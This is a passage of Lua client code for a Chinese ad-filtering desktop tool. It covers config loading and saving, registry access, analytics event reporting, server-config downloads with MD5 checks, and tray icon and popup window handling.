local g_bShowWndByTray = false
local gStatCount = 0
local gnLastReportRunTmUTC = 0
local gTimeoutTimerId = nil

local gbLoadCfgSucc = false
local g_tipNotifyIcon = nil
local g_bIsUpdating = false
local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local g_ServerConfig = nil

function LoadLuaModule(tFile, curDocPath)
--tFile可以传lua文件绝对路径、相对路径
	if "table" == type(tFile) then
		for index, value in ipairs(tFile) do
			if "string" == type(value) and value ~= "" then
				local dstPath = curDocPath.."\\..\\"..value
				if XLModuleExists(dstPath) then
					XLUnloadModule(dstPath)
					XLLoadModule(dstPath)
				else
					XLLoadModule(dstPath)
				end
				
			end
		end
	elseif "string" == type(tFile) and tFile ~= ""then
		if curDocPath then
			tFile = curDocPath.."\\..\\"..tFile
		end
		if XLModuleExists(tFile) then
			XLUnloadModule(tFile)
			XLLoadModule(tFile)
		else
			XLLoadModule(tFile)
		end
	end
end

local File = {
"luacode\\objectbase.lua",
"luacode\\helper.lua",
"luacode\\helper_token.lua",
"menu\\SettingMenu.lua",
}
LoadLuaModule(File, __document)

local Helper = XLGetGlobal("Helper")

local g_tPopupWndList = {
	--[1] = {"TipFilterBubbleWnd", "TipFilterBubbleTree"},
	--[2] = {"TipExitRemindWnd", "TipExitRemindTree"},
	--[3] = {"TipAboutWnd", "TipAboutTree"},
	--[4] = {"TipUpdateWnd", "TipUpdateTree"},
	--[5] = {"TipBubbleWnd", "TipBubbleTree"},
	--[6] = {"TipIntroduceWnd", "TipIntroduceTree"},
	--[7] = {"TipSysbootWnd", "TipSysbootTree"},
	-- [7] = {"TipFilterRemindWnd", "TipFilterRemindTree"},
}

local g_tConfigFileStruct = {
	["tUserConfig"] = {
		["strFileName"] = "UserConfig.dat",
		["tContent"] = {}, 
		["fnMergeOldFile"] = function(infoTable, strFileName) return MergeOldUserCfg(infoTable, strFileName) end,
	},
}


-----------------

function RegisterFunctionObject(self)
	local function FailExitTipWnd(self, iExitCode)
		local FunctionObj = XLGetGlobal("Global.FunctionHelper")
		local tStatInfo = {}
			
		tStatInfo.strEC = "failexit"
		tStatInfo.strEA = GetInstallSrc() or ""
		tStatInfo.strEL = tostring(iExitCode)
		tStatInfo.Exit = true
			
		FunctionObj.TipConvStatistic(tStatInfo)
	end
	
	local function TipConvStatistic(tStat)
		local rdRandom = tipUtil:GetCurrentUTCTime()
		local tStatInfo = tStat or {}
		local strDefaultNil = "gs_null"
		
		local strCID = GetPeerID()
		local strEC = tStatInfo.strEC 
		local strEA = tStatInfo.strEA 
		local strEL = tStatInfo.strEL
		local strEV = tStatInfo.strEV
		
		if IsNilString(strEC) then
			strEC = strDefaultNil
		end
		
		if IsNilString(strEA) then
			strEA = strDefaultNil
		end
		
		if IsNilString(strEL) then
			strEL = strDefaultNil
		end
		
		if tonumber(strEV) == nil then
			strEV = 1
		end

		local strUrl = "http://www.google-analytics.com/collect?v=1&tid=UA-55122790-1&cid="..tostring(strCID)
						.."&t=event&ec="..tostring(strEC).."&ea="..tostring(strEA)
						.."&el="..tostring(strEL).."&ev="..tostring(strEV)
		TipLog("TipConvStatistic: " .. tostring(strUrl))
		
		gStatCount = gStatCount + 1
		if not gForceExit and tStat.Exit then
			gForceExit = true
		end
		tipAsynUtil:AsynSendHttpStat(strUrl, function()
			gStatCount = gStatCount - 1
			if gStatCount == 0 and gForceExit then
				ExitTipWnd()
			end
		end)
		
		local iStatCount = gStatCount
		if gForceExit and iStatCount > 0 and gTimeoutTimerId == nil then	--开启定时退出定时器
			local timeMgr = XLGetObject("Xunlei.UIEngine.TimerManager")
			gTimeoutTimerId = timeMgr:SetTimer(function(Itm, id)
				Itm:KillTimer(id)
				ExitTipWnd()
			end, 15000 * iStatCount)
		end
	end
	
	local obj = {}
	obj.TipLog = TipLog
	obj.FailExitTipWnd = FailExitTipWnd
	obj.TipConvStatistic = TipConvStatistic
	obj.ReportAndExit = ReportAndExit
	obj.ShowPopupWndByName = ShowPopupWndByName
	obj.GetCfgPathWithName = GetCfgPathWithName
	obj.LoadTableFromFile = LoadTableFromFile
	obj.ShowExitRemindWnd = ShowExitRemindWnd
	obj.RegQueryValue = RegQueryValue
	obj.RegSetValue = RegSetValue
	obj.RegDeleteValue = RegDeleteValue
	obj.GetGSVersion = GetGSVersion
	obj.GetGSMinorVer = GetGSMinorVer
	obj.CheckTimeIsAnotherDay = CheckTimeIsAnotherDay
	obj.GetVideoDomainState = GetVideoDomainState
	obj.EnableWhiteDomain = EnableWhiteDomain
	obj.EnableVideoDomain = EnableVideoDomain
	obj.PopupBubbleOneDay = PopupBubbleOneDay
	obj.NewAsynGetHttpFile = NewAsynGetHttpFile
	obj.DownLoadFileWithCheck = DownLoadFileWithCheck
	obj.DownLoadServerConfig = DownLoadServerConfig
	obj.CheckIsNewVersion = CheckIsNewVersion
	obj.GetFileSaveNameFromUrl = GetFileSaveNameFromUrl
	obj.SetNotifyIconState = SetNotifyIconState
	obj.SetWndForeGround = SetWndForeGround
	obj.PopupNotifyIconTip = PopupNotifyIconTip
	obj.CheckCommonUpdateTime = CheckCommonUpdateTime
	obj.CheckAutoUpdateTime = CheckAutoUpdateTime
	obj.SaveCommonUpdateUTC = SaveCommonUpdateUTC
	obj.SaveAutoUpdateUTC = SaveAutoUpdateUTC
	obj.CheckMD5 = CheckMD5
	obj.GetSpecifyFilterTableFromMem = GetSpecifyFilterTableFromMem
	obj.SaveSpecifyFilterTableToMem = SaveSpecifyFilterTableToMem
	obj.SaveConfigToFileByKey = SaveConfigToFileByKey
	obj.ReadConfigFromMemByKey = ReadConfigFromMemByKey
	obj.CheckIsUpdating = CheckIsUpdating
	obj.SetIsUpdating = SetIsUpdating
	obj.GetTimeStamp = GetTimeStamp
	obj.CheckForceVersion = CheckForceVersion
	obj.IsUACOS = IsUACOS

	XLSetGlobal("Global.FunctionHelper", obj)
end


function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end

function MessageBox(str)
	if not IsRealString(str) then
		return
	end
	
	tipUtil:MsgBox(str, "错误", 0x10)
end


function GetTimeStamp()
	local strPeerId = GetPeerID()
	local iFlag = tonumber(string.sub(strPeerId, 12, 12), 16) or 0
	local iTime = tipUtil:GetCurrentUTCTime()
	local ss = math.floor((iTime + 8 * 3600  - (iFlag + 1) * 3600)/(24*3600))
	local strStamp = "?stamp=" .. tostring(ss)
	return strStamp 
end


function TipLog(strLog)
	if type(tipUtil.Log) == "function" then
		tipUtil:Log("@@client log: " .. tostring(strLog))
	end
end

function IsUserFullScreen()
	local bRet = false
	if type(tipUtil.IsNowFullScreen) == "function" then
		bRet = tipUtil:IsNowFullScreen()
	end
	return bRet
end


function CheckTimeIsAnotherDay(LastTime)
	local bRet = false
	local LYear, LMonth, LDay, LHour, LMinute, LSecond = tipUtil:FormatCrtTime(LastTime)
	local curTime = tipUtil:GetCurrentUTCTime()
	local CYear, CMonth, CDay, CHour, CMinute, CSecond = tipUtil:FormatCrtTime(curTime)
	if LYear ~= CYear or LMonth ~= CMonth or LDay ~= CDay then
		bRet = true
	end
	return bRet
end


function QueryAllUsersDir()	--获取AllUser路径
	local bRet = false
	local strPublicEnv = "%PUBLIC%"
	local strRet = tipUtil:ExpandEnvironmentStrings(strPublicEnv)
	if strRet == nil or strRet == "" or strRet == strPublicEnv then
		local nCSIDL_COMMON_APPDATA = 35 --CSIDL_COMMON_APPDATA(0x0023)
		strRet = tipUtil:GetSpecialFolderPathEx(nCSIDL_COMMON_APPDATA)
	end
	if not IsNilString(strRet) and tipUtil:QueryFileExists(strRet) then
		bRet = true
	end
	return bRet, strRet
end


function GetFileSaveNameFromUrl(url)
	local _, _, strFileName = string.find(tostring(url), ".*/(.*)$")
	local npos = string.find(strFileName, "?", 1, true)
	if npos ~= nil then
		strFileName = string.sub(strFileName, 1, npos-1)
	end
	return strFileName
end


function CheckIsNewVersion(strNewVer, strCurVer)
	if not IsRealString(strNewVer) or not IsRealString(strCurVer) then
		return false
	end

	local a,b,c,d = string.match(strNewVer, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local A,B,C,D = string.match(strCurVer, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	
	a = tonumber(a)
	b = tonumber(b)
	c = tonumber(c)
	d = tonumber(d)
	
	A = tonumber(A)
	B = tonumber(B)
	C = tonumber(C)
	D = tonumber(D)
	
	return a>A or (a==A and (b>B or (b==B and (c>C or (c==C and d>D)))))
end


function GetPeerID()
	local strPeerID = RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\gxzb\\PeerId")
	if IsRealString(strPeerID) then
		return strPeerID
	end

	local strRandPeerID = tipUtil:GetPeerId()
	if not IsRealString(strRandPeerID) then
		return ""
	end
	
	RegSetValue("HKEY_LOCAL_MACHINE\\Software\\gxzb\\PeerId", strRandPeerID)
	return strRandPeerID
end

--渠道
function GetInstallSrc()
	local strInstallSrc = RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\gxzb\\InstallSource")
	if not IsNilString(strInstallSrc) then
		return tostring(strInstallSrc)
	end
	
	return ""
end


function NewAsynGetHttpFile(strUrl, strSavePath, bDelete, funCallback, nTimeoutInMS)
	local bHasAlreadyCallback = false
	local timerID = nil
	
	tipAsynUtil:AsynGetHttpFile(strUrl, strSavePath, bDelete, 
		function (nRet, strTargetFilePath, strHeaders)
			if timerID ~= nil then
				tipAsynUtil:KillTimer(timerID)
			end
			if not bHasAlreadyCallback then
				bHasAlreadyCallback = true
				funCallback(nRet, strTargetFilePath, strHeaders)
			end
		end)
	
	timerID = tipAsynUtil:SetTimer(nTimeoutInMS or 2 * 60 * 1000,
		function (nTimerId)
			tipAsynUtil:KillTimer(nTimerId)
			timerID = nil
			if not bHasAlreadyCallback then
				bHasAlreadyCallback = true
				funCallback(-2)
			end
		end)
end


function CheckMD5(strFilePath, strExpectedMD5) 
	local bPassCheck = false
	
	if not IsNilString(strFilePath) then
		local strMD5 = tipUtil:GetMD5Value(strFilePath)
		TipLog("[CheckMD5] strFilePath = " .. tostring(strFilePath) .. ", strMD5 = " .. tostring(strMD5))
		if not IsRealString(strExpectedMD5) 
			or (not IsNilString(strMD5) and not IsNilString(strExpectedMD5) and string.lower(strMD5) == string.lower(strExpectedMD5))
			then
			bPassCheck = true
		end
	end
	
	TipLog("[CheckMD5] strFilePath = " .. tostring(strFilePath) .. ", strExpectedMD5 = " .. tostring(strExpectedMD5) .. ". bPassCheck = " .. tostring(bPassCheck))
	return bPassCheck
end


function DownLoadFileWithCheck(strURL, strSavePath, strCheckMD5, fnCallBack)
	if type(fnCallBack) ~= "function"  then
		return
	end

	if IsRealString(strCheckMD5) and CheckMD5(strSavePath, strCheckMD5) then
		TipLog("[DownLoadFileWithCheck]File Already existed")
		fnCallBack(1, strSavePath)
		return
	end
	
	NewAsynGetHttpFile(strURL, strSavePath, false, function(bRet, strDownLoadPath)
		TipLog("[DownLoadFileWithCheck] NewAsynGetHttpFile:bret = " .. tostring(bRet) 
				.. ", strURL = " .. tostring(strURL) .. ", strDownLoadPath = " .. tostring(strDownLoadPath))
		if 0 == bRet then
			strSavePath = strDownLoadPath
            if CheckMD5(strSavePath, strCheckMD5) then
				fnCallBack(bRet, strSavePath)
			else
				TipLog("[DownLoadFileWithCheck]Did Not Pass MD5 Check")
				fnCallBack(-2)
			end	
		else
			TipLog("[DownLoadFileWithCheck] DownLoad failed")
			fnCallBack(-3)
		end
	end)
end


function CheckIsUpdating()
	return g_bIsUpdating
end

function SetIsUpdating(bIsUpdating)
	if type(bIsUpdating) == "boolean" then
		g_bIsUpdating = bIsUpdating
	end
end


function DownLoadServerConfig(fnCallBack, nTimeInMs)
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	
	local strConfigURL = tUserConfig["strServerConfigURL"]
	if not IsRealString(strConfigURL) then
		fnCallBack(-1)
		return
	end
	
	local strSavePath = GetCfgPathWithName("ServerConfig.dat")
	if not IsRealString(strSavePath) then
		fnCallBack(-1)
		return
	end
	
	local strStamp = GetTimeStamp()
	local strURLFix = strConfigURL..strStamp
	local nTime = tonumber(nTimeInMs) or 5*1000
		
	NewAsynGetHttpFile(strURLFix, strSavePath, false
	, function(bRet, strRealPath)
		TipLog("[DownLoadServerConfig] bRet:"..tostring(bRet)
				.." strRealPath:"..tostring(strRealPath))
				
		if 0 == bRet then
			fnCallBack(0, strSavePath)
		else
			fnCallBack(bRet)
		end		
	end, nTime)
end

function InitGSFilter()
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local bFilterOpen = tUserConfig["bFilterOpen"]

	return SwitchGSFilter(bFilterOpen)
end


function SaveAllConfig()
	if gbLoadCfgSucc then
		for strKey, tContent in pairs(g_tConfigFileStruct) do
			SaveConfigToFileByKey(strKey)
		end
	end
end


function ExitTipWnd(statInfo)
	SaveAllConfig()	
	RestoreOSConfig()	
		
	TipLog("************ Exit ************")
	tipUtil:Exit("Exit")
end


function DestroyMainWnd()
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")
	local strHostWndName = "GXZBTipWnd.MainFrame"
	local objHostWnd = hostwndManager:GetHostWnd(strHostWndName)
	if objHostWnd then
		hostwndManager:RemoveHostWnd(strHostWndName)
	end
end


function DestroyPopupWnd()
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")

	for key, tItem in pairs(g_tPopupWndList) do
		local strPopupWndName = tItem[1]
		local strPopupInst = strPopupWndName..".Instance"
		
		local objPopupWnd = hostwndManager:GetHostWnd(strPopupInst)
		if objPopupWnd then
			hostwndManager:RemoveHostWnd(strPopupInst)
		end
	end
end


function GetGSVersion()
	local strGreenShieldPath = RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\path")
	if not IsRealString(strGreenShieldPath) or not tipUtil:QueryFileExists(strGreenShieldPath) then
		return ""
	end

	return tipUtil:GetFileVersionString(strGreenShieldPath)
end


function IsUACOS()
	local bRet = true
	local iMax, iMin = tipUtil:GetOSVersion()
	if type(iMax) == "number" and iMax <= 5 then
		bRet = false
	end
	return bRet
end


function GetGSMinorVer()
	local strVersion = GetGSVersion()
	if not IsRealString(strVersion) then
		return ""
	end
	
	local _, _, strMinorVer = string.find(strVersion, "%d+%.%d+%.%d+%.(%d+)")
	return strMinorVer
end


function RegQueryValue(sPath)
	if IsRealString(sPath) then
		local sRegRoot, sRegPath, sRegKey = string.match(sPath, "^(.-)[\\/](.*)[\\/](.-)$")
		if IsRealString(sRegRoot) and IsRealString(sRegPath) then
			return tipUtil:QueryRegValue(sRegRoot, sRegPath, sRegKey or "") or ""
		end
	end
	return ""
end


function RegDeleteValue(sPath)
	if IsRealString(sPath) then
		local sRegRoot, sRegPath = string.match(sPath, "^(.-)[\\/](.*)")
				
		if IsRealString(sRegRoot) and IsRealString(sRegPath) then
			return tipUtil:DeleteRegValue(sRegRoot, sRegPath)
		end
	end
	return false
end


function RegSetValue(sPath, value)
	if IsRealString(sPath) then
		local sRegRoot, sRegPath, sRegKey = string.match(sPath, "^(.-)[\\/](.*)[\\/](.-)$")
		if IsRealString(sRegRoot) and IsRealString(sRegPath) then
			return tipUtil:SetRegValue(sRegRoot, sRegPath, sRegKey or "", value or "")
		end
	end
	return false
end


function LoadTableFromFile(strDatFilePath)
	local tResult = nil

	if IsRealString(strDatFilePath) and tipUtil:QueryFileExists(strDatFilePath) then
		local tMod = XLLoadModule(strDatFilePath)
		if type(tMod) == "table" and type(tMod.GetSubTable) == "function" then
			local tDat = tMod.GetSubTable()
			if type(tDat) == "table" then
				tResult = tDat
			end
		end
	end
	
	return tResult
end

function PopTipWnd(OnCreateFunc)
	local bSuccess = false
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate("TipMainWnd", "HostWndTemplate" )
	local frameHostWnd = nil
	if frameHostWndTemplate then
		frameHostWnd = frameHostWndTemplate:CreateInstance("GXZBTipWnd.MainFrame")
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate("TipPanelTree", "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance("GXZBTipWnd.MainObjectTree")
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					
					local ret = OnCreateFunc(uiObjectTree)
					if ret then
						local iRet = frameHostWnd:Create()
						if iRet ~= nil and iRet ~= 0 then
							bSuccess = true
							ShowMainTipWnd(frameHostWnd)
						end
					end
				end
			end
		end
	end
	if not bSuccess then
		local FunctionObj = XLGetGlobal("Global.FunctionHelper")
		FunctionObj:FailExitTipWnd(4)
	end
	
	---初始化托盘
    if frameHostWnd and not g_tipNotifyIcon then
	    InitTrayTipWnd(frameHostWnd)
	end
end

function SetWndForeGround(objHostWnd)
	if not objHostWnd then
		return
	end

	if not IsUserFullScreen() then
		-- objHostWnd:SetTopMost(true)
		if type(tipUtil.SetWndPos) == "function" then
			local hWnd = objHostWnd:GetWndHandle()
			if hWnd ~= nil then
				TipLog("[SetWndForeGround] success")
				tipUtil:SetWndPos(hWnd, 0, 0, 0, 0, 0, 0x0043)
			end
		end
	elseif type(tipUtil.GetForegroundProcessInfo) == "function" then
		local hFrontHandle, strPath = tipUtil:GetForegroundProcessInfo()
		if hFrontHandle ~= nil then
			objHostWnd:BringWindowToBack(hFrontHandle)
		end
	end
end


function ShowMainTipWnd(objMainWnd)
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local bHideMainPage = FetchValueByPath(tUserConfig, {"tConfig", "HideMainPage", "bState"})
	
	local cmdString = tipUtil:GetCommandLine()
	
	local bRet = string.find(tostring(cmdString), "/forceshow")
	if bRet then
		bHideMainPage = false
	else
		local bRet = string.find(tostring(cmdString), "/embedding")
		if bRet then
			bHideMainPage = true
		end
	end
	
	if bHideMainPage then
		objMainWnd:Show(0)
	else
		objMainWnd:Show(5)
		SetWndForeGround(objMainWnd)
	end
	
	objMainWnd:SetTitle("绿盾广告管家")
	SendStartupReport(true)
	WriteLastLaunchTime()
end


function ShowPopupWndByName(strWndName, bSetTop)
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")
	local frameHostWnd = hostwndManager:GetHostWnd(tostring(strWndName))
	if frameHostWnd == nil then
		TipLog("[ShowPopupWindow] GetHostWnd failed: "..tostring(strWndName))
		return
	end

	if not IsUserFullScreen() then
		if type(tipUtil.SetWndPos) == "function" then
			local hWnd = frameHostWnd:GetWndHandle()
			if hWnd ~= nil then
				TipLog("[ShowPopupWndByName] success")
				if bSetTop then
					frameHostWnd:SetTopMost(true)
					tipUtil:SetWndPos(hWnd, 0, 0, 0, 0, 0, 0x0043)
				else
					tipUtil:SetWndPos(hWnd, -2, 0, 0, 0, 0, 0x0043)
				end
			end
		end
	elseif type(tipUtil.GetForegroundProcessInfo) == "function" then
		local hFrontHandle, strPath = tipUtil:GetForegroundProcessInfo()
		if hFrontHandle ~= nil then
			frameHostWnd:BringWindowToBack(hFrontHandle)
		end
	end
	
	frameHostWnd:Show(5)
end


function ShowExitRemindWnd()
	ShowPopupWndByName("TipExitRemindWnd.Instance", true)
end


function HideTray()
	if g_tipNotifyIcon then
		g_tipNotifyIcon:Hide()
	end
end


function InitTrayTipWnd(objHostWnd)
    if not objHostWnd then
	    TipLog("[InitTrayTipWnd] para error")
	    return
	end

	--创建托盘
    local tipNotifyIcon = XLGetObject("Notify.Icon")
	if not tipNotifyIcon then
		TipLog("[InitTrayTipWnd] not support NotifyIcon")
	    return
	end
	
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")
	
	----托盘事件响应
	function OnTrayEvent(event1,event2,event3,event4)
		local strHostWndName = "GSTrayMenuHostWnd.MainFrame"
		local newWnd = hostwndManager:GetHostWnd(strHostWndName)	
				
		--单击右键,创建并显示菜单
		if event3 == 517 then
			if not newWnd then
        		CreateTrayTipWnd(objHostWnd)
			end
		end
		
		--单击左键
		if event3 == 0x0202 then
			ShowMainPanleByTray(objHostWnd)
			ShowIntroduceOnce()
		end
		
		--点击气泡
		if event3 == 1029 then
			if g_bShowWndByTray then
				ShowMainPanleByTray(objHostWnd)	
			end
		end
		
		--mousemove
		if event3 == 512 then
			SetNotifyIconState()
		end
	end

	tipNotifyIcon:Attach(OnTrayEvent)
	g_tipNotifyIcon = tipNotifyIcon
	SetNotifyIconState()
	tipNotifyIcon:Show()
end


function ShowMainPanleByTray(objHostWnd)
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")
	if objHostWnd then
		objHostWnd:Show(5)
		SetWndForeGround(objHostWnd)
		local strState = objHostWnd:GetWindowState()
		if tostring(strState) == "min" then
			objHostWnd:BringWindowToTop(true)
		end
		
		-- local strHostWndName = "TipFilterRemindWnd.Instance"
		-- local objPopupWnd = hostwndManager:GetHostWnd(strHostWndName)
		-- if objPopupWnd and objPopupWnd:GetVisible() then
			-- local hWnd = objPopupWnd:GetWndHandle()
			-- if hWnd then
				-- objHostWnd:BringWindowToBack(hWnd)
			-- end
		-- end
	end
end


function SetNotifyIconState(strText)
	if not g_tipNotifyIcon then
		return
	end
	g_tipNotifyIcon:ShowNotifyIconTip(false)
	
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local bFilterOpen = tUserConfig["bFilterOpen"] or false
	local nFilterCount = tUserConfig["nFilterCountOneDay"] or 0
	
	local strState = "正常过滤"
	if not bFilterOpen then
		strState = "停止过滤"
	end
	local strDefaultText = "绿盾广告管家\r\n状态："..strState.."\r\n今日累计过滤："..tostring(nFilterCount).."次"
	
	local strResImageDir = __document .. "\\..\\..\\..\\..\\res"
	local strImageName = "GXZB.TrayIcon.Close.ico"
	if bFilterOpen then
		strImageName = "GXZB.TrayIcon.Open.ico"
	end
	
	local strImagePath = strResImageDir.. "\\".. strImageName
	if not tipUtil:QueryFileExists(strImagePath) then
		strImagePath = nil
	end
	
	local strShowText = strText or strDefaultText
	g_tipNotifyIcon:SetIcon(strImagePath, strShowText)
end


function PopupNotifyIconTip(strText, bShowWndByTray)
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local bBubbleRemind = FetchValueByPath(tUserConfig, {"tConfig", "BubbleRemind", "bState"})
	
	if not bBubbleRemind then
		g_bShowWndByTray = false
		return
	end
	
	if IsRealString(strText) and g_tipNotifyIcon then
		g_tipNotifyIcon:ShowNotifyIconTip(true, strText)
	end
	
	g_bShowWndByTray = bShowWndByTray
end


function PopupBubbleOneDay()
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastBubbleUTC = tonumber(tUserConfig["nLastBubbleUTC"]) 
	
	if not IsNilString(nLastBubbleUTC) and not CheckTimeIsAnotherDay(nLastBubbleUTC) then
		return
	end
	
	local nNoShowFilterBubble = tonumber(tUserConfig["nNoShowFilterBubble"]) 
	if not IsNilString(nNoShowFilterBubble) then
		return
	end
	
	-- if g_tipNotifyIcon then
		-- PopupNotifyIconTip("绿盾广告管家\r\n已开始为您过滤骚扰广告", true)
		-- tUserConfig["nLastBubbleUTC"] = tipUtil:GetCurrentUTCTime()
		-- SaveConfigToFileByKey("tUserConfig")
	-- end
	
	ShowPopupWndByName("TipFilterBubbleWnd.Instance", true)
	tUserConfig["nLastBubbleUTC"] = tipUtil:GetCurrentUTCTime()
	SaveConfigToFileByKey("tUserConfig")
end


function CreateTrayTipWnd(objHostWnd)
	local uTempltMgr = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local uHostWndMgr = XLGetObject("Xunlei.UIEngine.HostWndManager")
	local uObjTreeMgr = XLGetObject("Xunlei.UIEngine.TreeManager")

	if uTempltMgr and uHostWndMgr and uObjTreeMgr then
		local uHostWnd = nil
		local strHostWndTempltName = "TipTrayWnd"
		local strHostWndTempltClass = "HostWndTemplate"
		local strHostWndName = "GSTrayMenuHostWnd.MainFrame"
		local uHostWndTemplt = uTempltMgr:GetTemplate(strHostWndTempltName, strHostWndTempltClass)
		if uHostWndTemplt then
			uHostWnd = uHostWndTemplt:CreateInstance(strHostWndName)
		end

		local uObjTree = nil
		local strObjTreeTempltName = "TrayMenuTree"
		local strObjTreeTempltClass = "ObjectTreeTemplate"
		local strObjTreeName = "GSTrayMenuWnd.MainObjectTree"
		local uObjTreeTemplt = uTempltMgr:GetTemplate(strObjTreeTempltName, strObjTreeTempltClass)
		if uObjTreeTemplt then
			uObjTree = uObjTreeTemplt:CreateInstance(strObjTreeName)
		end

		if uHostWnd and uObjTree then
			--函数会阻塞
			local bSucc = ShowPopupMenu(uHostWnd, uObjTree)
			
			if bSucc and uHostWnd:GetMenuMode() == "manual" then
				uObjTreeMgr:DestroyTree(strObjTreeName)
				uHostWndMgr:RemoveHostWnd(strHostWndName)
			end
		end
	end
end


function ShowPopupMenu(uHostWnd, uObjTree)
	uHostWnd:BindUIObjectTree(uObjTree)
					
	local nPosCursorX, nPosCursorY = tipUtil:GetCursorPos()
	if type(nPosCursorX) ~= "number" or type(nPosCursorY) ~= "number" then
		return false
	end
	
	local nScrnLeft, nScrnTop, nScrnRight, nScrnBottom = tipUtil:GetScreenArea()
	
	local objMainLayout = uObjTree:GetUIObject("TrayMenu.Main")
	if not objMainLayout then
	    return false
	end	
		
	local nL, nT, nR, nB = objMainLayout:GetObjPos()				
	local nMenuContainerWidth = nR - nL
	local nMenuContainerHeight = nB - nT
	local nMenuScreenLeft = nPosCursorX
	local nMenuScreenTop = nPosCursorY - nMenuContainerHeight
	TipLog("[ShowTrayCtrlPanel] about to popup menu")
	
	if nMenuScreenLeft+nMenuContainerWidth > nScrnRight - 10 then
		nMenuScreenLeft = nPosCursorX - nMenuContainerWidth
	end
	
	-- uHostWnd:SetFocus(false) --先失去焦点，否则存在菜单不会消失的bug
	
	--函数会阻塞
	local bOk = uHostWnd:TrackPopupMenu(objHostWnd, nMenuScreenLeft, nMenuScreenTop, nMenuContainerWidth, nMenuContainerHeight)
	TipLog("[ShowPopupMenu] end menu")
	
	return bOk
end

-------------------------------

function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end


function ReadConfigFromMemByKey(strKey)
	if not IsRealString(strKey) or type(g_tConfigFileStruct[strKey])~="table" then
		return nil
	end

	local tContent = g_tConfigFileStruct[strKey]["tContent"]
	return tContent
end


function GetCfgPathWithName(strCfgName)
	local bOk, strBaseDir = QueryAllUsersDir()
	if not bOk then
		return ""
	end
	
	local strCfgFilePath = tipUtil:PathCombine(strBaseDir, "gxzb\\"..tostring(strCfgName))
	return strCfgFilePath or ""
end


function GetSpecifyFilterTableFromMem(strTableName)
	local tFilterTable = ReadConfigFromMemByKey("tFilterConfig") or {}

	if not IsRealString(strTableName) then
		return tFilterTable
	end

	return tFilterTable[strTableName]
end


function SaveSpecifyFilterTableToMem(tNewTable, strTableName)
	local tFilterTable = ReadConfigFromMemByKey("tFilterConfig") or {}

	if not IsRealString(strTableName) then
		tFilterTable = tNewTable
	else
		tFilterTable[strTableName] = tNewTable
	end
end


function SaveConfigToFileByKey(strKey)
	if not IsRealString(strKey) or type(g_tConfigFileStruct[strKey])~="table" then
		return
	end

	local strFileName = g_tConfigFileStruct[strKey]["strFileName"]
	local tContent = g_tConfigFileStruct[strKey]["tContent"]
	local strConfigPath = GetCfgPathWithName(strFileName)
	if IsRealString(strConfigPath) and type(tContent) == "table" then
		tipUtil:SaveLuaTableToLuaFile(tContent, strConfigPath)
	end
end


function ReadAllConfigInfo()
	for strKey, tConfig in pairs(g_tConfigFileStruct) do
		local strFileName = tConfig["strFileName"]
		local strCfgPath = GetCfgPathWithName(strFileName)
		local infoTable = LoadTableFromFile(strCfgPath)
		if type(infoTable) ~= "table" then
			TipLog("[ReadAllConfigInfo] GetConfigFile failed! "..tostring(strFileName))
			return false
		end
		
		local tContent = infoTable
		local bMerge = false
		local fnMergeOldFile = tConfig["fnMergeOldFile"]
		if type(fnMergeOldFile) == "function" then
			bMerge, tContent = fnMergeOldFile(infoTable, strFileName)
		end
		
		tConfig["tContent"] = tContent
		if bMerge then
			SaveConfigToFileByKey(strKey)
		end
	end

	gbLoadCfgSucc = true	
	TipLog("[ReadAllConfigInfo] success!")
	return true
end


function MergeOldUserCfg(tCurrentCfg, strFileName)
	local tOldCfg, strOldCfgPath = GetOldCfgContent(strFileName)
	if type(tOldCfg) ~= "table" then
		return false, tCurrentCfg
	end
	
	tCurrentCfg["nLastAutoUpdateUTC"] = tOldCfg["nLastAutoUpdateUTC"]
	tCurrentCfg["nLastBubbleUTC"] = tOldCfg["nLastBubbleUTC"]

	tCurrentCfg["nLastCommonUpdateUTC"] = tOldCfg["nLastCommonUpdateUTC"]
	
	if type(tCurrentCfg["tConfig"]) ~= "table" then
		tCurrentCfg["tConfig"] = {}
	end
	
	local tOldStateConfig = tOldCfg["tConfig"] or {}
	for strKey, tStateInfo in pairs(tOldStateConfig) do
		--是否开机启动以安装时选择为准
		if strKey ~= "AutoStup" then
			tCurrentCfg["tConfig"][strKey] = tStateInfo
		end
	end	
	
	tipUtil:DeletePathFile(strOldCfgPath)
	return true, tCurrentCfg
end


function GetOldCfgContent(strCurFileName)
	local strOldFileName = strCurFileName..".bak"
	local strOldCfgPath = GetCfgPathWithName(strOldFileName)
	if not IsRealString(strOldCfgPath) or not tipUtil:QueryFileExists(strOldCfgPath) then
		return nil
	end
	
	local tOldCfg = LoadTableFromFile(strOldCfgPath)
	return tOldCfg, strOldCfgPath
end

function CreateMainTipWnd()
	local function OnCreateFuncF(treectrl)
		local rootctrl = treectrl:GetUIObject("root.layout:root.ctrl")
